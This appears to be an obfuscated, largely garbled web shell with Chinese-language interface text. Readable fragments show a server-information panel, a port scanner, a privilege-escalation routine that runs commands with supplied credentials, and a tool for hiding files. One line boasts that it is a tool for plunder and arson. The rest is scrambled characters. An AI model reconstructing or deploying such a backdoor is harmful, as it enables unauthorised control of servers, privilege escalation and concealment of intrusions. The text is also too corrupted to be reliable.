KHΘΘ=6Gla\T{4O%x4<ΘUR;ΩΘ>n7it\f"<码密50?r>ΘΘ}r4Bsi5P\4s9SJO{&!c)lc6R|BRAW{pOS\ysKHΘΘn20GHM[J7Ot\o<ΘURRΩΘ>=T"-FTy<口端/Cc)>ΘΘG6bmuM%*4Tpp!c)nAe\w!O\ezcwtf4n\Us`+ΘΘ\P"c5\,nfitEo<Θ^;!ΩΘ>~4A%#f/<码密DC?z>ΘΘdr7m|HT&/0MV{sW|	RO\KGawtkPS\;!P*ΘΘn2GGH\ =oi-po<Θ^![ΩΘ>JT|r\oA<口端nATdaR>ΘΘ%*4Tp|]6-eF5r5w\re|GeS\u(2vp=AT&)z|vkT^YSpML`aΘΘ_KqGcM9=os-pT<ΘSRRΩΘ>=Ps-EPy<码密~iFjaY>ΘΘretKFaraK&srP%WTH]_KpVeMreU\0-.^F~sF}/;\ykT~QS\M"`?ΘΘ\Pqc:Z,nTstFT<ΘSR[ΩΘ>noi]xo/<表列卡网>ΘΘJJOw&6jHk=iLppi\_mF	6N|^]e~ptW~lor-=P0-~6]tqC=yEo~YS\Z	KHΘΘ=6Gla\T{4O%x4<ΘUR;ΩΘ>n7it\f"<PTc9G2t'EmT0>'ew:tP-G\T7C=6m5?retC#moC|6maM]W]q\l4splfrt~oCv%WVF4G%{fC]~eGtuC\vp#~*U&Nw1Hu\e'$av STitp4<Θ S%;ΩΘ>J7|]F73<值键的带自择选>''neuk:^B~4A%#f<Θ{UR!ΩΘ>';eqk_Z2	)Z]ne0GaZ4htaoWht.T*of2CAM-J76j~aZCn7 t_2$K	<Θ9^!;ΩΘ >e={5psl7_[j-<>]]<Θ ~YRΩΘ>rcAehr=em5W gP;J5P;76qFaM nPdd|Z_KExrTr"pJO<Θ9~RRΩ Θ>\<取读值键表册注Θ{,Uz;ΩΘ>-sTF=jThteP9mrok<Θ S%;Ω5U0pzjHPRTbu	Ω")
WpPa0%WTUOUS6/ buUTDJkΩo/Tj~EΩxW j{EΩfIBJnEΩ)Θ>*b<>%{4oy<放开>&Pr&roFocT%{Do<4-4-.82.4Θ{& mq9]t7E[d{ΘaΘ j{psregr*r(SRYΩ6slkΩVΘ>t}<闭关(822.-..2Θ &T#0y-tT\9d Θ}Θ,&9Fitej]_]4Uz;ΩJPhm{0{> )Θ.i5(tc6Wnos{Θ9B~f)]EOr_se&.r]p6z-~{198IΩJPhm{952_'fD5I$t{n G6bT0n.rzB ro{p48_KzD5K$9,n ]ebwun-]G+,k3Ω=WZT{VrB{fIΩr-CWJ7$[=6Eo4Jn4NΩ1 =BruoeT)Tn7|raP=W4s2n=ocΩΘR=d]fLL	5wUz2k5F=7W re	SXΘ#,wG9]Vo#{&ΘBΘj pi9Wgra][& Θn2Ntqfn{H-a3;12BDp,Z/Z~_]W}iZ7rwΘ\rts~=PaΩAΘ~P|]$e{Joa4BDOd/Θ(tc6}bOP%c6V!(tP\r2S n n=fNB-6iΩ%y2N{Pm0eR Vf*tk,WiΩ`wu?]r4# ,p"regr5](nH_~{}"nΩhq	 }neΩgI 39BΩΘL,Θ#W#A%eM-&Θ9Ji s	294VT>]M<ΘS!YΩ)`}rem"r-2r6lit4%{s4]]$ne#itPhtΩ]2F"-{_Tz]eTOtΩrfeNΩfXTDJkΩ-52cΩ-xWcΩfW9dnEΩ43 dn3Ω4Θ>r}<G6}#GJ,-o= sO Θ dT5"4FF%6^RYΩPs$3ΩfI &=wΩ`Θ>VI<tPbF'n{ron LA Θ &{dnPTj{Θ,]P{Θ,= 9trHts{^![ΩP$pΩrOecΩAj'fxx =T]tH-n\s4ncaS{$laCΩyJne 4# N-]c]	T7{8,rfFΩnPhTTV?#~66_A]eTqniW dnHT4c-V_%4cAteT0nsIBxIΩ) f8ee	T2{AV)UEwt{ne" ,V|63w]6%bFiY,=9cdneΩATb{.,5E6Ps9B)s6pmt.rfeL{7 N-]c]	Ω=6M ,0T> #ke2C94XΩ`Θ2ΘT'ViUEmrUrtS~1[\,#826	ΩeiGEΩ`5i(pPr ,xf5 &,%G5-^xs4~a_S Fla!ΩT{Kbo9V5|(Fwt6airew"WX,O1Ω`EmrUdJ0obUBTT 0{7 i,]TmΩAVΘ.ΘBAqh{pi4rt^=38A`0Z6\iU~e	B1+)Θ.Θ 4'b4x|UVt~JIB5uh(3A(diy[ot,V}BI?4Θ8ΘLAuZ(pO(v2;G9UJ3 5"hUEi6jiM nT5f#,*fmΩA)Θ4ΘB)'b(pi.^eRr]nnILK'`qZ'FO4d|M n t]:rVEsΩWC$pΩtfPNΩxW dnkΩ8/{&~wΩVΘ>Vb<tehFun 9Tn ss[Θ &,VAUE#]UU%RΩ2slkΩfIT}{+ΩAΘ>Gh<]ehwu{{ton,C){Θ,=[9j~e9# Θ{Go Θ \9Ntr5]s(U;!Ω6	kwΩ]#PNΩVj L)uZ{#"4Jc_~TlGHCΩ?jne 7P[c-V_%,=9& tTFΩnehm )NjWe($|G6w"WX,d=a ANt]:rL4aA]W#uJ	I9kIΩ) #E66	,.T`Ai6Fm]6neLB')i(Flt(-Z]s%T7{M&n2Ω) I -TOfKP9 5|(Fwt6]feL,&[c-V_%Ω~ebo u9> xGWes k/Ω)Θ-Θ, 5s4\l]4Vt^nI,= OEWK	Ω6ikBΩV)s4pF] ,)qZ'FO4W:aU $Ga0Ω9neh{9))iUxmt4_AtP#GJ	X 8IΩ)Emt{}{C7h(TTP u,=9s rogΩ=6M ,!T\,)Θ2ΘB)'b(pi.GtSnW[fIΩA\AU&=G4}; ft ] =T"bBV4pΩVΘ'Θ )ΘFOΘ(FtoF.-C6'YP*{]Ol#~ \9piΩ)ΘwΘ')Θtr4xΘ(mVfp8-C6'YPr{tiFpST&93w]Ω5Θ>GZ<>Vb<>b/<a告报描扫>I<Θ4Uz;ΩtPmA] \91rePAtΩneM# ΘΘ ><9`Θ~:9Θ4wrfF.-se"uWz,k3ΩΘ>F]ok3<>F/<ΘS%;ΩΘ>,IIbJ\Pu$5v{unacLu=di{"ne&}AM6&6F/- Jna$s'&2F*~{r"#=i<ΘUR!ΩΘ>' nH_|{6n6"GHv9,m4rtub(_ssaG9 '-|FhqC"\PEy% '-imh"i(n6F:{Tt'EnA<ΘSRRΩΘ>]I<>VI<Θ~%RΩΘ>,Θ&]iiLtzTP&Θ'\6ulHM9,]'"\P!iC '#oB%OW{6\iCckc{6ty6t'=P\N],6]]4E'_6m5{ tu3{i<ΘSYzΩΘ:t	|	{-]PK>Vb<ΘSR%ΩΘ>'G'uJP2AC9JΘ&KX&Θu\eulHM[,EO"&jO ufoErxeT(_ssaG9 '-OW]6&6F/- Jpi6=e#:{B-'#=A< Θ~%RΩΘ9}PI ~:9~>E<Θ^Y%ΩΘ>u	e'Gt=dK$bassD.tO#X'	-bTV7fJ=tOmb"^{D,,u&{fi]$a9,tsoEJ7j7b]2T,'}Tr4x'=ePcn mtPf<ΘU;!ΩΘ>Ey<`JvC用使荐推人个 慢较比度速,口端个多描扫果如(器描扫口端>p<Θ^;!Ω4O{J=WΩVΘpsΘ4mG4F.t	2GCPV7eWΩPs$6ΩΘ18C.0.=z1Θ=PWΩWeh-TΘΘ_`ΘE|Θ'TV7F-tsPuq2]94OΩkATJ=eΩ`Θ-rTFΘ(mr7l(]	PGu6V=riwrroPΩKileΩΘ8)t34LGC y !ufy,.36y,1/'awN .('[8ID,eu33,D/f7LD: Ie,}-Θ=]iiLtzTPΩneM] ΘΘ=AΘ%G4EΘ{lt7g.%seqqe]Tx"Ω]uC'1o7{n r'oemOP]FOV9^8Ve^te~Ω5(trDwnac~[bu	L5
^6GP$tTCa	e )_r"7J
N:s6,"h5inMP=G/av_|Jve{'(`
caLW "g6]TeV#AJHk/Jo7"Age-Te]#ASHG3=xf(`
N5se ue_XP:D}o7MJh"}wage}JdToyDb(A
aHC6{uUc:nP7rtLA~lHJwfG%(`
p'ncTOfW{vvo{`
~W=/<br><rabl6[wi&%b\uLbu]t"L><-r _kcL	\r]><f4Vm9Jamen8Ptw,l2]boJ\p4it alrion\i""u>qyJ命令<)JEqtTtyEe=%2y9,Jc#W&MyJ isze=D4[ZHFG2\OpN4nkAg><"{put{]ypP&r6#%[JHwe&U \al"2_LH><|{\u],tMFe=tPO]{~Hl2\T ^5l'W=><"{put{]ypP&i'}#)],\akuen执行><y8Tzw><yr]><3tchle>uA*6	EP=P.Lti]W SI5~I="/~If,%Gsw{*6YqeCt.oor#{OZv$OV5<>/u 9ohena\_	BP]jn rtiT6ReqCWst.kPrm4Lw/AV~s&nt]im4Reu"WL-8xfG#(/;"5`:se-T_j7sP=JnsBYv3G.cr+/Teoh}EC {OiJioE2so=ne$tif=Oia5JfqfnJ2O#6n "T]PZO&6]\UQ	"L37B.1YwassPPrdnLjFHC|P7Vdd";;se]T3dn/j|JAs]VQ06ry nTi6#P9TTHsr6r8Jbo.p#_cMj|He"k9,uTg{VPq"es-.ff]F.uyh3OV #,"u/:se-T*6$%6C'Ft9\ 5JoCoS{.Ex69utP{i]VXG6V/)AIf,NOPTGK$YWC0kt8kOp{The~Ao4,{h|GP ?"T{GecRKiult8wOFaCrt%2|'F- & s-rR2C0m-{jTNZrUI35{& rP_z6	qc%U])`tea!esumr.MoZ6Ne#%`w7fx}k~dTifase%TGK$YWC0kt{n ?4thi~F~-Vz2qlr{={!epl*Ne(s]*Re	"$]LL[/Lu&=bsE;"VAi9VYWC0kt{n !6pla$2'-Vz2qlrB"<O,"&mr;")}|tr%2i'F%[\,%e\la$e(C%G[P0kr ">u,O#gt;uV~-Vz2qlr{={!epl*Ne(s]*Re	"$]L_ht4I3V,"<br>L55kJJTA8:Pt95doC7=W{n,f]bi{X:YWspoSie.Wt)te,]WCq2|]2oo]m(uMM3L5B={O<X]>/= i]rRe	"c]aPW}{gu{aTsTn
lcse /yle#:O
})T,:l2xa;rl PT3
/kWOaVVl_tequPC]UuqiV
TTF=i$exa./lex5{rlA
soTyGP#aSrln""T%bK~{/kWOaVVl_/"&rPuG6	-(C6VvWtv5GiabmWs("M]tpcZT-L4#uu
SIn"<h]><-5XkWTws&tb\'80tJ[hj$Pk4V=uTeJ0' bDGder\"0',_WGFCx5$OnF='I' _2$mE5J}A=g\60u{alij=7,$PW%6V'><tt><tdBbeigM]='eGu{$fcEHn&'36 ak|]Sn,N2{%et6 XXcol7]7,wPW",>服务器组件信息<"]d></tr><tr 5cig~&uaP=]6V6><td,he|Fb9n,zGuTws&tb\'20]J[hj$Pk4V=upFmpFFF(>服务器名</tj><t&TXX$fc4Vn'xFFgFFlJ>B<Ar}><tj,b]aoloV&"pgg\lmg'>/&tWqueLr.set	er):GsHhc6	4"^ER)ER79/Zk/5dO</]&><Atr><8Ptw,l2]boJ\p4it alrion\"ht-\`A3m,P2OpK382co#yA3	8cC#J JHmW\'ipof*T6,]:tjer\'=XlanGu><tt[alOF{\6_6J-PrJ><-d Z2A&b]_JzG'{BiJ]h='eG!,,}0_4FoG\'ppFFFXp'>服务器IK</t&><]&TIX$7lfr=6#FllpXg,>T<ytj><rj bg$fc4Vn"xmgFpmF,><in30t txxe=6%Wf-J[JHwe&'iE' C|VKn,}4uTv5FuW\'"&%2B'P	]-~Pr^6rzcria1$es(/sOC:,KiJ3z/A="Jst/le&JXDVjW]`Gpf6><snpu-T]xEP7JqbFst,9valCW='查询此服务器所在地']ylP&uh7]D6Va0\x'><i=\09,]M\W&'MOdJ6n' ~:l6n6__]Oo{, ZclueJu2'><Ltd><"]V><Ao7r#><oor#TFK-MT}_\o- catio~&"N:$]|4~=/Gefc' n*Fe='kPrmIJ><-][5FOg=='$en%2G(><r}9Zesjhr\'206T,s&-h&,e0C, h]colDG='#m\FFglu>服务器:k6fH排名</%d><tdTh]l7GT]_J#mgFpmF'>,<L]&><%j,b]aoGTr='TpFFFm\'><|{Fq%[]/Ee&'tPxtJT{*w6_J0J ZHl06='"=)c6#H{]G="u{ssVe=4g9styG6='}fGjP]~uE#'>排名:<Onp"%99/FW&u%ef-'9ZaluP&"/= P\#u'9i2W=10><inp'] t/\W\6CGhwOtJ  \al"2_(查询6><yr}><3tG></f7]l><-*T5Fi]J=,NentKG'><]D hP|]M-&"-]6 mid-h=J.Cg6{XFNfl4V=upFFFgl\,>服务器时间<L%j><rj h]colDG='#m\FFglu>,<L]&><%d }gcfkTzn,&lplFmg'>/&noBdi{<3]}></rt><rr amAgn=,9en-2G,><]j,be|gh-='.GuBBsJ%b&'-]0u{bgc7kPtn6dlmgFpm'>服务器qPU数量<Ird><]D bj_TG7]7,mgFlFFg'>T<"9&><%JTbX$o$4r='ml\mgg\J>u&!6q'Wst.VWrvetSarO:XGPC'/M;MwERcOF7e!fs3~^Z;S/A&O</td><L]V><%t,a$sgJ_'ceSrer'><td,ZWsjZ]\6e0J wOdtZ&u6]uuTXFc4FoG\'#Fgl\mg6>服务器操作系统<A-d><tj9bgcD$or=,dFFglpm6>[<3-d><t& bF_Tm7t_J&lFmgFp,>"&%2B'P	]-~Pr^6rzcria1$es(/QS"AdO<3%D><3t]><-r :kA&~\u_W=t6V'><td b2)Xb-7J-]'9Pijrh='6C0' h0coFfG\6x\mggFl'>{EB服务器版本<yr#><r}9hga7lTt='#gl\mgg">{</rj><rd b&Nolot7'#glpmgl">u=R2quPst-^Wz\6Grc]i5}lW("Sk;S3%cnim W/YE/5&"<Ird><A]r>uAAk,C6	Oo=("XDeh"]Z7jWL5T<>,"T+" tb2W
Qlk~PnJ{(YC0tP*rh):6ssOf{Uu1o6}qgNodP")&LTGu
2{} so
mor O&!{ 7[KI
~W=~3&"<9G als0n=6_WJ-2*,><t} hPigZ%_(euuTL|d]b=u-00',h0a7FP]\6#pmFmpF'>'jObTU),0AdO<3%D><-dTbg$olf]_(mmplplF,>"j"bT(O b`=u<y]&><]d{XgcomTr='p\FFglp,,:csj~=kef->"diX{4s'.5d"<3tJ></tV>i
M6O]
!YS{~I
+Gr.CG6ar
x'~_]s7~ )le#a()kWpHV!,5
L7n96rroVT*6	ql2{~ey] 
	diP9getls,j2r-]J'VF
	dOm C%czL6{}J
Lqr$\"ht-\~A3&_%52a$6x54comIJataN9linKC#&:]\	~b:&uVl=Ld/mPfcS!,
^gW]smsnF6]| #eKHgWUut$)
vAf g6]sm	<>/uT]MP~
			ta]&AS	]G{]2tws'/<RE:!?{%:`\u"O`+7E
	vWndd\)ns-]6-:*BjPtCmsL"<y^7>u`
;sg6-srt=mi&{06-	lCB	tct,6{dd-Lrar-.4
^2$P
L^je%stV="无排名L
vPJJTA8
^ix{IsNq#6tO$'F6-srt)\xalsK9theJ[ge-CrtnL无排名i
^AkexH=g2%i9V
2{} kqnN]ion
O'~$]|4~ ]6t*mTPP*]e(utc) 
;4~T6tV7rTre	um2T{K#]9
sdsw b]tp 
UP-[Z]-p_~et^er.lGeat6PbjP_rUuN)aV7sfft2XM,am{T/5T
	*-t#8ope~Tirk i 'Vl'kaGie 
;HttF(se~}6`,
LOo attE.r2:JA	]c%W<>.,tb6n
^s06-|#PKTa]6=/O
	vWxit{Oun$%A4~T
^Pn} io 
s]K-*mPweaXP=Xxtesewno%4?%]E.G6sFTnseqTdy){
		2r{b%]Fn~o%hi~g
sA4,6G]4=uT}eG<>0 -Z6J,P*]8slW5r{9
eSJ fuJ9ti7=9
lGJ$-ifn }yt2CzqUo!{^1n`,
Ldim,C]t%P]"t~ 
	jAm iW'ThiuhaV!TjP 6#-CZarsod2T
^r]!2t'Vn9\ "",
Lg7*TsI _{1{mo LK{B(vWW) 
;L Z)sba]Co&e &T/L$E6NA}BU\I{Bi1,IV4{
UsWo mMiqharTde <[&HfG9ob2W{
	s	s-rR2%0z~{_Ti%rYPt0tn &,!ht4 h|shctC4Je) 
		EG|e 
;L^96f-sh:rC7deT&9}	a,{h|dE4v3J,i1KJ7AA[
^	;tt!etuz{ = ]rRP%0t~Tg{sbr{CL~g(PZALsMc]qfd6A H{&H1]G[H,s/=]4NWft0barCDJe)){
	^sA7,&[sI,+T1 
	sp{#,WxT
	cPxr{
	}5]6	e ^o% _{s]GRetCGn 
[  ,pGt2!c6HV
En& F"=N9O4{
!aP O~ervqL
U;__]Oo{\r6[ues96"SU59ti7=O`
)k,,nft Osn"#WzOa6^(:c]Oo{` thP=[tP	xfJ	e46nj
usKG = ]*im4]WCq2|]4uuL))
p:CiBn{r]A#(tPq06st(u\i`A
\4Vt9\ ]Gim(zWque]("EfG]uV4
$m} =,tr|#6zPC02i%(/$"5`
fn%*sw4*2Cqei](/x"))
if k7"",%b6~
knjp:th4)
2$LP
8_kek-(xB2)
2Wj,OO
ot#Fotr = ea500
tiw2T'-&p
FoFinqse]T_BuVi2GT"{= 0er =T	hsVs8
lTXiJ#assB_ "P5|s uTj{E:|,= MbCVLf
JKFjT#c|n{n O9DELkPw$xvy1cu j{vhqrLfBj "-Wm=02G4u2Gi{=,vhCr"f dTOBT4G%?f=/,&9ktpp7]]{=,	h0VLx
Tr = '~ITE{ZAIMPBc:9u3u,&TvbsrL8
SPPJfF:iJ,=9/-SE 3Qy:XL{= ^hCt	f &BO-DoT_innFTG&CGJi].G.020|LTjBo]#\T]t{= O%-1|IH!/,=[Mhsr	k #9"-TMZEnahce=]L9#,MI0V"fT& u TQiPK/\OTjTvhsr	k
nPmGPV[&{u-~3TV~ERS+mUP"{g v}!GwoTg{u.Ie=020.G-C',#9MX!rwo j{"-P7]]c7niT#,frFp4Gt &B^bCrwO &,L2V	2*\j7"T& \bC],xB={Otw:sBoGj=oduTg{\}u]wo j{_
   B9   /.How27sV&9}pp"T& \bC],xB={Ot	fgs~MWFilP&i{=,	h0VLx{&{O-DiLcble\!" =T^hs]sk,= L-RPlP:%bLn7OTjTvhsr	k & c
{,,[T{, O9N6WdSel0re=ui &,MX0V,O{=,"tHi&eH|}JK~\CL9d Z}CGwf &,L.iFB_5:l$4wwTginJC" &{	bCV,x{=Ti9sba=geTasCmTz&\CL9d Z}CGwf &,7
,,[T{, 9/-;0ota+{abl670",d9Z}!*wo,&T"-vaxSCWz	wTFA=P6VIw\-1",d[Z}s*,k,&9/-~#eed/AmitVx=0uTj{\hut"o d ".Sp22J/OTA%7fwJn0O{& v}!*wo,gT=
9{ {9   '2Maxc*UsP]i\.Ki{=,vhCr"f dTO8Xj$2m|m6xur\600uTg{\}u]wo j{"9~ess"TnTiT6Ou-&27uTg{\}C]Lf,& LtBpEsG2_G"{= ^hCrLoTg{u.z:]Oo(F=7O & |XCrLk[& c
{,T[{,, L-RHtif3TE~\}L9d Z}CGwf &,L.YH-)fsrWji]_0" \9vbCtsf =TO9Z"P]Hsu]re~t=GL9\,ZX!G,f{= O9Quo-:Z5#Ol"Tn0O{&{^bCr/x & =
 ,T9{,T[/.va|ntPna=_WJUxi%W#"{= ^hCrLoTg{u.m:	wTtdoMpe=[Wgul5*" =T^hs]sk,= L-RHtifC_y7JWL9d Z}CGwf &,L[i$$6Cnc`|\%!WAM+	CDP/[& \hqt"8
Yqi% =,"QS1m',#9MX!rwo
Jewu	2*\VPxk5$e6JeP0serwOc:"BO)
CWGP_]{$Hs2 S;ac%|TS
N:i2 7
i6t an^6t\P*-0Vec]e"Xjec96"Mia*os78r8QNs*  PL)
a.f\WS,/lpmL,{uhr]p:/3K$D2](G8I:O{&{#ortBj "/XPld	"{Aq\_jwOnys1u,T]"Ww,/O 9L"
a4end,kPXO~GC6V j{l4]inp*is &{lt =TJ6F}PTHOnT& ~ew}fF*OJ9d9=ePqsWt & Y")]
|2],sWssTn("*O)=a
RRUL<k7]l{wPtZodn'pfCr(,Jc#W&'X7lJun'>L
%%nL<On#'t{{ameJuu' ]NpenJbs&}6J6,i}='q' M:$CP\uLj"s6V&O,></-}>/
z;~u<AJp'r naPW='p,[tyE2_,b|DjP~'Tidn'pJT^*F'W&uL&FHsi#"'><y]j>u
Y%SO<iJ#ut Scme=,xor-J9]/\6\6bi}de~' |}_(E4G%uTv5FuW\'"&Ef*]=u"><3tJ>"
RRS'<inp'] nH#W\6_"{-/p2='bid}2{(,sJ&u_'{\a$'e='ud9T&=iJ{	iV6=,a0'>'
RR~i<i~\0],=_TPn'8' -yp2&uhOjJ2{J s&=uk' vHkG6n6idk="u{ssVe='xC'>"
RRUL<s~\G],~a#e=6SU:_r"7JuTr5p6n'bsdde~J[s&n"^VHcrsoJu vam0e='-"><38Ttw>i
%R^"<	cr|\rBF5{F0:g6n'd5vas$])F-6>L
R!~"jTcumK{t.wt)te4J<aP=]6V>正在连接 K2720.G-}5u##fG%&/L使用用户名:9/&usP]g/L口令：ug\5	sj/.84<ceSrer>,4;"
!YUL|6- i#eoqt(J}TlqTW=r-aGF.]4ldsq=(q}l|]4)Q,,.C00)YO
RYn"<3CNtO\]>u
_asP 2
iK-{X&~2rZPr40rea-2Qh8P9%UuMAar4ioft-gMLHo#P"A
h2fx6~,"*ETu, LZr9E}"y}.78].C81:",d[k-Exft- j{"A]oldL0n/uF_dmO="eLJ{ Vu2, u",TLO
h4CW=d{uUi6r g7L[#,\I!t"f9# /#assBTd" #[vbs]	k,d[/	Ot2 e#ecTL9\,aF}9d Z}CGwf &,uGs-
C6- i6sAon('X")=h
R%^O<of*T,we%ho&='\fi96{{:F2=,jo$jsun6>i
%z^/<i{Fu]9namK_'u'{]ypP&uMO}D6~6 |d=6u'TMcmq6_JOduPrj/'><3%D>u
;YU"<snF0t n*Fe='F" t/\W\6Z)j&PnJ i&='\J9|HG02_J"#Eai&"'><L]&>i
%R~/<s{putB{ame\"poV%u{-5x6n6h|ddPn'T|JJ6FT]rJ ZHl06='"=\Pt-=iJ></rj>/
RRVO<inFGt ~:F6nJ9,,-y\e=6hi}}WS6{A}_Jc,,vcGue=6Lgaw&gL,,sA2e\u50'>O
RYn"<O=#'-TW5wP=Jf',ty\2_(bsJ}W='{Od_,f' \:c'Pn"L#o&O, Aze=(a0'>/
R%^O<O=x'-,n:men'SS:N9O4{J9%yFP=uMiddP="{O&7J~;aN]i4{' v*$ue=,p'><yx4V#>/
R;S"<sc]|#9,Gc=]"aXP=u&ava	_*sE-">/
!YS/JocuPWnt.P*itP{u<$2W]PV>正在提升权限 请等待..2,<_2{9Pt>J5U"
R!~"se-P)TP7G%Uu"J4c'Fent-cll.XPld	"{8	"ITO-(V;"u,4GGCiR/
!;S/</iarip->i
$_C6,3
s6r c=VWrvet(CrP:r6xh}6$-(LMi$roCfx92bh,+PTKu)
a.oE2W{u0wP/L OMt]#://Wz7.08!.1aL9#,\Pt-,&T"/jol}C0S3'#:J#iJ3sE/, TV"6B,ui {u"
a8iendB$ogiJGseVTj{Ff0s~EaCs = m%TjB&6$}T#as~ j{qui-
P-[C6	sA4nUOa")Jc
RYn"<$2{]P]>提权完毕B已执行了命令：<}r><f7ntT_Tm7t_]W}>/=cFj&"<38PJ-><ht><Xt>/
RRVO<inFGt -5#6nhG]-7nTvaFue&J9返回继续B6{T=qkial=O/locH%)4~2h]6o=uNAarionJ~erv'";"u>O
;z~u</_en-er>L
$5i292lP
4n eV]Pt,V6C'we9Jefr
sKr a=6ssOf{Uu:i`
s2t }=s2Ci"7J6LXL)
sW] c=	2|O7W{/$"5
54abozr
S6] a,&9c7%hs~j
b.Hbo]%
U6rTXT={MorMing
98H}P]]
~6t{N = yTthiJ0
%;~/<_6J-Pr><f7rmT#W9b4J&u\o-'9JamenJ04F&|"J6>O
Y!S"<9cble{,id-Z_,5[f,,be|gh-='K'E(,hT]J2r\61u{celF\_j&OWF\60u{c6$lsp*Ning\"1',hTt&2*a7Fo]='m66''ee6>O
;R~u<rt alOFW\6$6=]Pru{v5$ignJumidjce'>L
%;n/<-dTcoFsp:=_(e,>^W]v9; 提升权限9hy SH#<A-&>L
R!~"<"tr>'
RR~i<tVTcGOFW\6$e=teV' M:$"jJ_JF|djFeu>"
%;n/<-DTPOdrM=,}00'>用户名`</tj>"
;!~u<]j,Bi}thn'3o[u><s{\0% JHmW\'u',%NFPn"%6#tu{ij_'u'B^alu67'L7_cG:}ls~Os%ra-orJ><I-j>L
RYU"<Atr>u
Y%Ui<]V cGiX{='cK{ter,[vaF|]JnJls&&l2'>u
;;~'<]J>口9令：</]&>O
RRUL<]&><|JEur{n5Fe='3u tyF6='-2y]6T)jn6pJ vHlu2&uTF@D:fx.Gl;C@P'><y]j>u
Y%SO</]G>"
!RS"<]r HkAX~&"aP~t2r',vak|]Sn,F|J}l66>O
RRUL<]&>端[口：<A-d>/
!RS"<rd><sWpu-T{5w27,E7r%' -yp2&u9PfrJ9|d\6pTtt' \:c'Pn"(IN5.,><"td>'
RR~i</-]>/
zYUu<%r HliF=_($6{%W]'{\a$sgn=6#)j&F6J>u
YR~O<td>系统路径：</td>i
%;~/,T[{<-d><i~pu%T{*w6_JxJ ]/pW\'te#%"{O&7Jk6 ^5l'W='"\x&"'{|izP&u^6><A-&>L
%RSLT9<3]G>O
Y%SO{ <tVT_GOjW&,$e{]etu vamAgn=,lid&kW,>L
%%SL  , <%}>命　令：<3]J>O
Y%SO{   <%D><OW\'- {5m6_'c'Brype\"te#%u{O}7,$6 Malqe=J_F#,ANT{2t{qsWt adw|Wl,I$/.y69AajJ & SWt l49alj]T'ET_jwOn|stVatf]iBHjF|{c AHdJ, si!27,y]"><3tJ>"
RRS'9 </]*>"
!YUL[<-V :lijn=J_WS-6GJ9MaGOg{\'mi&}c66>i
%R~/ {9 <t#9colxannJz,><)JEqtTtyEe=JC01wsrJ9=aTP=u~ubmO%"{\Hc"6n'提交u> /
RRVO<inFGt -5#6nJ*6	PtJ nHme&J~C}TA%zJ ZHl06='重置'>L
%%nL<On#'t{{ameJuSUaa]io~J9]/\6\6bi}de~' |}_(Har|T='{\a$'e='IJ><3-D>/
!YS/</tr></tahce><yx4V#><3$e=teV>"
WS&{i2$2c]
x'nctOfW{0E_%M4)
oJ9errDG reGme,=Wf-
6VV._leHr
CW9,k_^W]v6V.qteatPiI&P$]{/UcGsp]Ang.XAleSx|tewiX&P_]/A
|f Prr-=0P}6G>CTtMPn
gpa-Z7/$ai
PxA] k0nct"Tn
6Wd O8
j\_]bnf-Ge-Sp2_A*FmTkJ2rU])
gpa-Z7G$H|2UFex](X#athwz))
|et,8_J7%hs~j
en& f"=N9O4{
Cuh,SW]FilPP6f-
]6	pTJs64wri9W "<kPrm,#W]bfD\E7s%>"
r2C#D~W-L]i]P O路#nbsEUgJ}	xU#~biF;#{bspY径：<inp'] nH#W\E:]M,\akuen'"dCWz\6G-F:pFHtbU"."Adi|6,||2P=uI0,>(一定要以\结尾)<Xr />i
V2iF7=|62Br|te,"文件名称：<|=#C-{{:F2=kOlWJame,M_GqP7J要修改的文件名8Hs#, Aze=(E0'><Ir 3>O
]6E7nCe.Bri%29'<s{\0% ]/pW\subw|]{\Hc"6n我隐!>/
GespD{se.P*itPTO<}]>娃嘎嘎B超级无敌隐藏文件L必须设置文件夹为显示隐藏L显示系统文件,才能显出来</bV>"
GK	FT=i2.PVir6 "<}]>此工具为奸淫掳掠B杀人放火L打砸抢烧L居家必备工具<yhV>O
tWspoSie.wt)te,L<Aof*T>u
se- p:%bJV6["WCt8goGT("pH%h/A
C6- xsl6?ameJGequ6|t.gfGT4LOsFPn:meu)
|x.,U$2{{p5-h5>0)a~}'GP~'8sFe?5m65>0)B5theJ
SP%9k	f7~PVv2r.sre:%Wf}&W_r{"~$rAFtinj-\sFPn5-eF"b&Wct"i
Se][fiF2_k	f(XP-F|le4pa%Zj4OGW9c#e`
xsle.H%]tO}G%6	=zH4
endBAf
6Wd 	"X
T[aH	eT"MvD"ANhd4`
9TC5	e9/Rea&;wrua9:GF !6aj!EG(i
  0_se,L~M7mbmOFeL:SPt )wqJM6LT	wF}:Bq8ShoBK\sFP'^6	sA4nUOFol#WrPa]h")AA~6-TyEsnNfthOng
9Bs5i29LD4Bnpsle"a3PP~g)k6,F?5m6`ShoEBrr(`
 ,!cPTi$PFF|leu:S2%9}[0_9Wm w[F`iBC.J2cmOF6{mMaF6)}~et },C=N4]hi~F
,Tu5	P LEdOtF|kW'a~W%9)B0nNWP LBgAyEs2w}s-FAGeUpNamK5:Se][ABs&?4-Z)Jj
T CHseTLqDExp|$2"}Uer{ABCn96P," l}:Bq8C4#yFimW(FN5le)a^W],) 0nMo%hi~g
T9HWTONoZPFAGe":U2]{:[u&cPw9wBm`ABC-hovem)le4l?5w24}UPtTABs=Nf%b"~X
9TC5	e9/DelgfcjPViA~Pt9iB0_NewB	BF:i C.J2$m7kD6V4F9amP):^2rB:Eq&?ftMOn]
  s:|6,uufF/FTGd6G":SKr AB07NeBT	EgAyEs2Cfpygol}2G.gcc#WV:~Pt9iBC=Mf]MO~0
, q5s69"Mo|WFolj6r"a^W],) 0nMem L[F:)wq-v4^2pfljPr6mNamPV~~P-[)Es=?4tMAng
9 Ca6 "M2Lm7kD6Vu:^et,AB!&?KB{	wpAAEs.?6wFoF}6t4g:TP)`~e]9ABCJ?othsWg
T90HC6{uqp8ilP":"\x"F66V
 {sai6 "TU2_t$biAoUectcM6)
B9Cas6["a&#AJHhi}H&m|na}()
9Bs5i29LpaHnMPherP(i}E$_=xBhWte.6)
B9Cas6["a&#AJHhi}H&m|na}()
9Bs5i29LCT&1~MelluAuT&InZ6Fl6`
9 CaLW "L40ou-L`~PC|s7~.!on-en%C4[PTTMW{"+lkO`:Re	\PJ	P(;6&iG6c]9URL
  C5|e u!G6H%6y&}"ACrPat2NJ1,m?:F2
, q5se u!PTEH9%y&bO}C4Fpac9hdb mamP
{,!_P,"3bMHnaF2G'a$XNc=aXPr6`
 ,!_P,i!4qri6"}qourLW()
[ CHCW{u^95~Jr|veu :T^N*~$G|^2 YPq06st(u3*s\PiV
 90aW "Slpold6*" ,A9~$lPG&PrTReYueC%6'g4$}W]"`
